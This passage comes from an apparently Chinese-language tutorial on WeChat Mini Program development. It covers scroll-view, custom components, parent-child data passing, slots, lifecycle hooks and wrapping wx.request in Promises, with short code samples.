class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Page</span>(&#123;</span><br><span class="line">    <span class="attr">data</span>:&#123;</span><br><span class="line">        <span class="attr">list</span>:[</span><br><span class="line">            &#123;<span class="attr">id</span>:<span class="string">&#x27;1&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;apple&#x27;</span>,<span class="attr">value</span>:<span class="string">&#x27;apple&#x27;</span>&#125;,</span><br><span class="line">            &#123;<span class="attr">id</span>:<span class="string">&#x27;2&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;pear&#x27;</span>,<span class="attr">value</span>:<span class="string">&#x27;pear&#x27;</span>&#125;,</span><br><span class="line">            &#123;<span class="attr">id</span>:<span class="string">&#x27;3&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;grape&#x27;</span>,<span class="attr">value</span>:<span class="string">&#x27;grape&#x27;</span>&#125;,</span><br><span class="line">        ],</span><br><span class="line">        <span class="attr">checkedlist</span>:[]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="title function_">handleChange</span>(<span class="params">e</span>)&#123;</span><br><span class="line">        <span class="keyword">const</span> checkedlist = e.<span class="property">detail</span>.<span class="property">value</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">setData</span>(&#123;</span><br><span class="line">            checkedlist</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="5.11-scroll-view-滚动视图区域">5.11 scroll-view 滚动视图区域<a title="#5.11-scroll-view-滚动视图区域" href="#5.11-scroll-view-滚动视图区域"></a></h3><p>属性：</p><blockquote><p>使用竖向滚动时，需要给<a href="https://developers.weixin.qq.com/miniprogram/dev/component/scroll-view.html" target="_blank">scroll-view</a>一个固定高度，通过 WXSS 设置 height。组件属性的长度单位默认为px，<a href="https://developers.weixin.qq.com/miniprogram/dev/framework/compatibility.html" target="_blank">2.4.0</a>起支持传入单位(rpx/px)。</p><p>less 使用 calc 希望css 原样使用  height:~’calc(100vh - 90rpx)’</p></blockquote><ul><li>scroll-x：允许横向滚动</li><li>scroll-y：允许纵向滚动</li><li>scroll-top：设置竖向滚动条位置</li><li>scroll-left：设置横向滚动条位置</li></ul><blockquote><p>点击 其他标签 使本来轮动到一定距离的页面 在顶部显示</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scroll-view</span> <span class="attr">scroll-top</span>=<span class="string">&quot;&#123;&#123;scrollTop&#125;&#125;&quot;</span> <span class="attr">bindTap</span>=<span class="string">&quot;handleChange&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">data</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="attr">scrollTop</span>:<span class="number">0</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="title function_">handleChange</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">setData</span>(&#123;</span><br><span class="line">        <span class="comment">//重新设置 右侧内容的scroll-view标签的距离顶部的距离</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">scrollTop</span>:<span class="number">0</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6.自定义组件">6.自定义组件<a title="#6.自定义组件" href="#6.自定义组件"></a></h2><h3 id="6.1-使用自定义组件">6.1 使用自定义组件<a title="#6.1-使用自定义组件" href="#6.1-使用自定义组件"></a></h3><ol><li><p>新增组件</p><img src="https://s1.328888.xyz/2022/04/09/XaM80.jpg"  style="zoom:80%; float:left " ></li><li><p>定义组件  在组件的 json 文件中进行自定义组件声明</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在组件Tabs.json</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;component&quot;</span><span class="punctuation">:</span><span class="keyword">true</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li><li><p>声明组件 在要使用组件的 json 文件中声明组件</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//demo.json</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;usingComponents&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Tabs&quot;</span><span class="punctuation">:</span><span class="string">&quot;../../components/Tabs/Tabs&quot;</span>        <span class="comment">//组件名称:相对路径</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li><li><p>使用组件 在要使用的页面 使用</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- demo.wxml --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Tabs</span>&gt;</span><span class="tag">&lt;/<span class="name">Tabs</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="6.2-注意事项">6.2 注意事项<a title="#6.2-注意事项" href="#6.2-注意事项"></a></h3><p>在页面 .js 文件中 事件回调函数 放在 与data 同层级</p><p>在组件 .js 文件中 事件回调函数 放在 与data 同层级 的 methods：{} 中</p><h3 id="6.3-父向子组件传值---通过属性传递">6.3 父向子组件传值 - 通过属性传递<a title="#6.3-父向子组件传值---通过属性传递" href="#6.3-父向子组件传值---通过属性传递"></a></h3><ol><li>在父组件wxml里 给子<code>&lt;tabs&gt;</code>组件 定义属性</li><li>在子组件js里 的 properties 接收值  属性名aaa : { type:数据类型,value:”” }</li><li>就可以直接在子组件wxml里使用了</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//com.wxml</span><br><span class="line"><span class="tag">&lt;<span class="name">Tabs</span> <span class="attr">aaa</span>=<span class="string">&quot;bbb&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">Tabs</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//tabs.js</span></span><br><span class="line"><span class="title class_">Component</span>(&#123;</span><br><span class="line">  <span class="comment">//组件的属性列表</span></span><br><span class="line">  <span class="attr">properties</span>: &#123;</span><br><span class="line">    <span class="attr">aaa</span>: &#123;</span><br><span class="line">      <span class="attr">type</span>: <span class="title class_">String</span>,</span><br><span class="line">      <span class="attr">value</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;)</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//tabs.wxml</span><br><span class="line"> <span class="tag">&lt;<span class="name">view</span>&gt;</span>&#123;&#123;aaa&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="6.4-子向父组件传值---通过事件传递">6.4 子向父组件传值 - 通过事件传递<a title="#6.4-子向父组件传值---通过事件传递" href="#6.4-子向父组件传值---通过事件传递"></a></h3><ol><li><p>子组件 点击事件 bindtap = ‘handleitemchange’ 触发 handleitemchange 事件</p><p>通过 this.triggerEvent( ‘父组件自定义事件名称 itemChange’ , 要传递的参数) 触发 父组件 的 binditemChange 事件 传递给父组件信息</p></li><li><p>父组件 自定义事件 binditemChange = ‘handleItemChange’ 被触发 自身处理事件</p><p>通过 handleItemChange(){} 函数 接受 参数 处理事件</p></li></ol><blockquote><p>代码中 如果 只是 父向 子组件 传 tabs ， 其他业务逻辑在子组件编写 也是会有效果的</p><p>但是 是因为 在子组件 接收到 tabs 后 处理 逻辑时 setData 后 把tabs 放在了子组件 的data里</p><p>父组件的值并没有改到</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//父组件.wxml</span><br><span class="line"><span class="tag">&lt;<span class="name">Tabs</span> <span class="attr">aaa</span>=<span class="string">&quot;bbb&quot;</span> <span class="attr">tabs</span>=<span class="string">&quot;&#123;&#123;tabs&#125;&#125;&quot;</span> <span class="attr">binditemChange</span>=<span class="string">&quot;handleItemChange&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">Tabs</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//子组件.wxml</span><br><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">...</span> <span class="attr">bindtap</span>=<span class="string">&quot;itemchange&quot;</span> &gt;</span>&#123;&#123;item.value&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//子组件.js</span></span><br><span class="line"><span class="title class_">Component</span>(&#123;</span><br><span class="line">  <span class="attr">properties</span>: &#123;</span><br><span class="line">    <span class="attr">tabs</span>: &#123;</span><br><span class="line">      <span class="attr">type</span>: <span class="title class_">Array</span>,</span><br><span class="line">      <span class="attr">value</span>: []</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">data</span>: &#123;&#125;,</span><br><span class="line">  <span class="attr">methods</span>: &#123;</span><br><span class="line">    <span class="comment">// 父子组件之间的通信</span></span><br><span class="line">    <span class="title function_">itemchange</span>(<span class="params">e</span>) &#123;   <span class="comment">//子组件 bindtap 触发的名字</span></span><br><span class="line">      <span class="keyword">const</span> &#123; index &#125; = e.<span class="property">currentTarget</span>.<span class="property">dataset</span>;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">triggerEvent</span>(<span class="string">&#x27;itemChange&#x27;</span>, &#123; index &#125;); <span class="comment">//父组件自定义事件名 bind + &#x27;...&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//父组件.js</span></span><br><span class="line"><span class="title class_">Page</span>(&#123;</span><br><span class="line">  <span class="attr">data</span>: &#123;</span><br><span class="line">    <span class="attr">tabs</span>: [</span><br><span class="line">      &#123; <span class="attr">id</span>: <span class="number">1</span>, <span class="attr">value</span>: <span class="string">&quot;首页&quot;</span>, <span class="attr">isActive</span>: <span class="literal">true</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">id</span>: <span class="number">2</span>, <span class="attr">value</span>: <span class="string">&quot;新闻&quot;</span>, <span class="attr">isActive</span>: <span class="literal">false</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">id</span>: <span class="number">3</span>, <span class="attr">value</span>: <span class="string">&quot;同城&quot;</span>, <span class="attr">isActive</span>: <span class="literal">false</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">id</span>: <span class="number">4</span>, <span class="attr">value</span>: <span class="string">&quot;我的&quot;</span>, <span class="attr">isActive</span>: <span class="literal">false</span> &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="title function_">handleItemChange</span>(<span class="params">e</span>) &#123;  <span class="comment">//父组件自定义事件值 </span></span><br><span class="line">    <span class="comment">// 接受传递过来的参数</span></span><br><span class="line">    <span class="keyword">const</span> &#123; index &#125; = e.<span class="property">detail</span>;</span><br><span class="line">    <span class="keyword">let</span> &#123; tabs &#125; = <span class="variable language_">this</span>.<span class="property">data</span>;</span><br><span class="line">    tabs.<span class="title function_">forEach</span>(<span class="function">(<span class="params">v, i</span>) =&gt;</span> i === index ? v.<span class="property">isActive</span> = <span class="literal">true</span> : v.<span class="property">isActive</span> = <span class="literal">false</span>)</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">setData</span>(&#123;  <span class="comment">//修改数据</span></span><br><span class="line">      tabs</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="6.5-slot-插槽">6.5 slot 插槽<a title="#6.5-slot-插槽" href="#6.5-slot-插槽"></a></h3><p>其实就是一个占位符 直接写在组件标签里面，这些里面的东西就会替换slot</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//父组件</span><br><span class="line"><span class="tag">&lt;<span class="name">Tabs</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">view</span>&gt;</span></span><br><span class="line">    111</span><br><span class="line">  <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Tabs</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//子组件</span><br><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;tabs&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">slot</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="6.6-组件的其他属性">6.6 组件的其他属性<a title="#6.6-组件的其他属性" href="#6.6-组件的其他属性"></a></h3><p>​Component 里面的<a href="https://developers.weixin.qq.com/miniprogram/dev/reference/api/Component.html" target="_blank">属性</a></p><div class="φbq"><div class="φbs"><table><thead><tr><th style="text-align:left">定义段</th><th style="text-align:left">类型</th><th style="text-align:left">是否必填</th><th style="text-align:left">描述</th><th style="padding:0"></th></tr></thead><tbody><tr><td style="text-align:left">properties</td><td style="text-align:left">Object Map</td><td style="text-align:left">否</td><td style="text-align:left">组件的对外属性，是属性名到属性设置的映射表</td><td style="text-align:left"></td></tr><tr><td style="text-align:left">data</td><td style="text-align:left">Object</td><td style="text-align:left">否</td><td style="text-align:left">组件的内部数据，和 <code>properties</code> 一同用于组件的模板渲染</td><td style="text-align:left"></td></tr><tr><td style="text-align:left">observers</td><td style="text-align:left">Object</td><td style="text-align:left">否</td><td style="text-align:left">as vue watch — 组件数据字段监听器，用于监听 properties 和 data 的变化，参见 <a href="https://developers.weixin.qq.com/miniprogram/dev/framework/custom-component/observer.html" target="_blank">数据监听器</a></td><td style="text-align:left"></td></tr><tr><td style="text-align:left">methods</td><td style="text-align:left">Object</td><td style="text-align:left">否</td><td style="text-align:left">组件的方法，包括事件响应函数和任意的自定义方法，关于事件响应函数的使用，参见 <a href="https://developers.weixin.qq.com/miniprogram/dev/framework/custom-component/events.html" target="_blank">组件间通信与事件</a></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"></td><td style="text-align:left"></td><td style="text-align:left"></td><td style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:left">created</td><td style="text-align:left">Function</td><td style="text-align:left">否</td><td style="text-align:left">as vue created — 组件生命周期函数-在组件实例刚刚被创建时执行，注意此时不能调用 <code>setData</code> )</td><td style="text-align:left"></td></tr><tr><td style="text-align:left">attached</td><td style="text-align:left">Function</td><td style="text-align:left">否</td><td style="text-align:left">as vue mounting — 组件生命周期函数-在组件实例进入页面节点树时执行)</td><td style="text-align:left"></td></tr><tr><td style="text-align:left">ready</td><td style="text-align:left">Function</td><td style="text-align:left">否</td><td style="text-align:left">as vue mounted  — 组件生命周期函数-在组件布局完成后执行)</td><td style="text-align:left"></td></tr><tr><td style="text-align:left">moved</td><td style="text-align:left">Function</td><td style="text-align:left">否</td><td style="text-align:left">as vue updated  — 组件生命周期函数-在组件实例被移动到节点树另一个位置时执行)</td><td style="text-align:left"></td></tr><tr><td style="text-align:left">detached</td><td style="text-align:left">Function</td><td style="text-align:left">否</td><td style="text-align:left">as vue destoryed  — 组件生命周期函数-在组件实例被从页面节点树移除时执行)</td><td style="text-align:left"></td></tr></tbody></table></div></div><h2 id="7.-生命周期">7. 生命周期<a title="#7.-生命周期" href="#7.-生命周期"></a></h2><h4 id="7.1-应用-app.js-生命周期">7.1 应用 app.js 生命周期<a title="#7.1-应用-app.js-生命周期" href="#7.1-应用-app.js-生命周期"></a></h4><ul><li><p>全局最外层是App({})</p></li><li><p>onLaunch() : 触发：应用第一次启动时;</p><p>​                    作用：应用第一次启动时，获取用户个人信息</p></li><li><p>onShow() : 触发：应用被用户看到时</p><p>​                  作用：对应用的数据或页面效果 重置</p></li><li><p>onHide() : 触发：应用被隐藏时</p><p>​                作用：暂定 或 清除定时器</p></li><li><p>onError() : 触发：应用代码发生了报错的时候</p><p>​                  作用：收集用户的错误信息，通过异步请求，将错误信息发到后台</p></li><li><p>onPageNotFound() : 触发：应用第一次启动时，找不到第一个入口页面</p><p>​                                作用：通过js重新跳转到第二个首页 wx.navigateTo({url:’…’}) 不能跳转到tabbar页面</p></li></ul><h4 id="7.2-页面-demo.js-生命周期">7.2 页面 demo.js 生命周期<a title="#7.2-页面-demo.js-生命周期" href="#7.2-页面-demo.js-生命周期"></a></h4><ul><li><p>data : 页面初始数据</p></li><li><p>onLoad : 页面加载完毕 发送异步请求初始化页面</p></li><li><p>onShow : 页面显示</p></li><li><p>onReady : 页面渲染完毕</p></li><li><p>onHide : 页面隐藏 切后台/跳链接</p></li><li><p>onUnload : 页面卸载  点击超链接 open-type 的值中 有包含关闭页面的才ok ：redirect、reLaunch、navigateBack</p></li><li><p>onPullDownRefresh : 监听用户的下拉刷新操作 进行页面数据 效果 的刷新操作</p></li><li><p>onReachBottom : 监听页面上拉触底事件 需要让页面 上下滚动</p></li><li><p>onShareAppMessage : 点击右上角转发操作</p></li><li><p>onPageScroll : 页面滚动</p></li><li><p>onResize : 页面尺寸发生改变 小程序 横屏/竖屏切换</p><blockquote><p>开启页面横批 在页面的json文件 ＋</p><p>{ “pageOrientation”:”auto”}</p><p>然后在模拟器中就可以找到 切换模式 按钮</p></blockquote></li><li><p>onTabItemTap : 当前页面 tabbar 页面 点击自己的 tab 键时</p></li></ul><h2 id="8.异步请求">8.异步请求<a title="#8.异步请求" href="#8.异步请求"></a></h2><h3 id="8.1-使用-wx-request">8.1 使用 wx-request<a title="#8.1-使用-wx-request" href="#8.1-使用-wx-request"></a></h3><p><a href="https://developers.weixin.qq.com/miniprogram/dev/api/network/request/wx.request.html" target="_blank">官网位置</a></p><p>一般将异步请求写在页面周期函数的 onLoad 里</p><img src="https://s1.328888.xyz/2022/04/09/XaECy.jpg"><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.js</span></span><br><span class="line"><span class="title class_">Page</span>(&#123;</span><br><span class="line">  <span class="attr">onLoad</span>: <span class="keyword">function</span> (<span class="params">options</span>) &#123;</span><br><span class="line">    wx.<span class="title function_">request</span>(&#123;</span><br><span class="line">      <span class="attr">url</span>: <span class="string">&#x27;https://service-dxtrccme-1302998929.gz.apigw.tencentcs.com/release/accordin&#x27;</span>,</span><br><span class="line">      <span class="attr">success</span>: <span class="function">(<span class="params">result</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">fail</span>: <span class="function">(<span class="params">err</span>) =&gt;</span> &#123; <span class="variable language_">console</span>.<span class="title function_">log</span>(err); &#125;,</span><br><span class="line">      <span class="attr">complete</span>: <span class="function">() =&gt;</span> &#123; &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//to be function</span></span><br><span class="line"><span class="title class_">Page</span>(&#123;</span><br><span class="line">  <span class="attr">onLoad</span>: <span class="keyword">function</span> (<span class="params">options</span>) &#123;</span><br><span class="line">    <span class="title function_">getSiwperImage</span>()</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="title function_">getSwiperImage</span>(<span class="params"></span>)&#123;</span><br><span class="line">    wx.<span class="title function_">request</span>(&#123;</span><br><span class="line">      <span class="attr">url</span>: <span class="string">&#x27;https://service-dxtrccme-1302998929.gz.apigw.tencentcs.com/release/accordin&#x27;</span>,</span><br><span class="line">      <span class="attr">success</span>: <span class="function">(<span class="params">result</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">fail</span>: <span class="function">(<span class="params">err</span>) =&gt;</span> &#123; <span class="variable language_">console</span>.<span class="title function_">log</span>(err); &#125;,</span><br><span class="line">      <span class="attr">complete</span>: <span class="function">() =&gt;</span> &#123; &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="8.2-优化异步请求es6-promise">8.2 优化异步请求es6 promise<a title="#8.2-优化异步请求es6-promise" href="#8.2-优化异步请求es6-promise"></a></h3><blockquote><p>方便嵌套</p></blockquote><ol><li>在 request 新建 index.js 到处 封装好的 Promise 的request</li><li>在要用到 异步请求 的页面 index.js 导入 request 用来发送请求的方法</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在 request 新建 index.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">request</span> = (<span class="params">params</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    wx.<span class="title function_">request</span>(&#123;</span><br><span class="line">      ...params,</span><br><span class="line">      <span class="attr">success</span>: <span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">resolve</span>(res);</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">fail</span>: <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">reject</span>(err)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//页面 index.js </span></span><br><span class="line"><span class="keyword">import</span> &#123; request &#125; <span class="keyword">from</span> <span class="string">&#x27;../../request/index.js&#x27;</span></span><br><span class="line"><span class="title class_">Page</span>(&#123;</span><br><span class="line"> <span class="attr">onLoad</span>: <span class="keyword">function</span> (<span class="params">options</span>) &#123;</span><br><span class="line">    <span class="title function_">request</span>(&#123; <span class="attr">url</span>: <span class="string">&#x27;https://service-dxtrccme-1302998929.gz.apigw.tencentcs.com/release/accordin&#x27;</span> &#125;).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">setData</span>(&#123;</span><br><span class="line">        <span class="attr">swiperlist</span>: res.<span class="property">data</span>.<span class="property">data</span></span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line"> &#125;,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="8.3-提取公共接口路径">8.3 提取公共接口路径<a title="#8.3-提取公共接口路径" href="#8.3-提取公共接口路径"></a></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在 request 新建 index.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">request</span> = (<span class="params">params</span>) =&gt; &#123;</span><br><span class="line">    <span class="comment">//定义公共接口路径</span></span><br><span class="line">  <span class="keyword">const</span> baseUrl = <span class="string">&#x27;https://...&#x27;</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    wx.<span class="title function_">request</span>(&#123;</span><br><span class="line">      ...params,</span><br><span class="line">       </span><br><span class="line">      <span class="attr">url</span>:baseUrl+params.<span class="property">url</span>,  </span><br><span class="line">        </span><br><span class="line">      <span class="attr">success</span>: <span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">resolve</span>(res);</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">fail</span>: <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">reject</span>(err)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="8.4-es7-的-async-语法">8.4 es7 的 async 语法<a title="#8.4-es7-的-async-语法" href="#8.4-es7-的-async-语法"></a></h3><p>es7 的 async 号称是解决 回调的 最终方案</p><p>异步 -&gt; 同步</p><blockquote><p>因为小程序 明确指明支持 es6 -&gt; es5</p><p>所以写es7 语法会比较麻烦 如果设配比较旧 设备的时候 还是用es6 的promise</p></blockquote><ol><li>小程序开发工具中，勾选 es6 转 es5 语法</li><li><a href="https://github.com/facebook/regenerator/blob/master/packages/runtime/runtime.js" target="_blank">下载facebook的regenerator库中的</a></li><li>在小程序目录新建文件 lib/runtime/runtime.js 将代码拷贝进去</li><li>在需要使用anync的地方引入 import regeneratorRuntime from ‘…/…/lib/runtime/runtime’</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 